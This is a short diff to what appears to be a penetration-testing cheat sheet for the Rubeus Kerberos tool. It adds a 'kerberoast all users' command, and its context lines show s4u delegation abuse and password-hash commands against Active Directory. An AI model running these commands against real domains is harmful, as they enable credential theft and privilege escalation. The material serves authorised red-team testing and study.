@@ -68,3 +68,11 @@ Rubeus.exe s4u [/ticket:"$TGT"] /msdsspn:"$SPN" /tgs:"$SERVICE_TICKET" [/altserv
 ```powershell
 Rubeus.exe hash /password:$PASSWORD /user:$USERNAME /domain:$DOMAIN
 ```
+
+---
+
+## Kerberoast all Kerberoastable Users
+
+```powershell
+Rubeus.exe kerberoast
+```
